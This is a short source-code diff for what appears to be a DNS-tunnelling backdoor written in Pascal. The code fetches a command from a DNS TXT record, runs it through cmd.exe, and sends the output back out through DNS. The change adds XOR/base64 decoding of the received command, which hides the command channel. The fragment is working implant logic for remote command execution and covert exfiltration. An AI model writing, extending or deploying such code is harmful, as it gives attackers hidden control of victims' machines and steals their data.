@@ -493,7 +493,6 @@ begin
       end;
 
   end;
-  writeln(i_host);
   status := false;
   p2 := Tstringlist.Create;
   TXTvalueQuery;   // Query an active dns server for txt value to pass as valid command
@@ -501,11 +500,11 @@ begin
   DNSd.TargetHost := i_host;
 
   if DNSd.DNSQuery('live.'+i_host, QTYPE_TXT, p2) then
-   writeln(length(p2.text)); // length of accepted DNS query
+    writeln('[!] DNS Query Length: ',(length(p2.text))); // length of accepted DNS query
    if length(p2.text) > 1 then
-  writeln('[+] Yo! Command captured  <-'+p2.text);
+ writeln('[+] Yo! Recieving Encrypted command [ '+p2.text+' ]');
    {$IFDEF Windows} // for windows env
-  RunCommand(systemfolder+'\cmd.exe',['/c',p2.text],str);
+  RunCommand(systemfolder+'\cmd.exe',['/c',XorDecodeBase64(p2.text)],str);
    {$IFEND}
 
   exfiltrate(str); // send command results into dns server
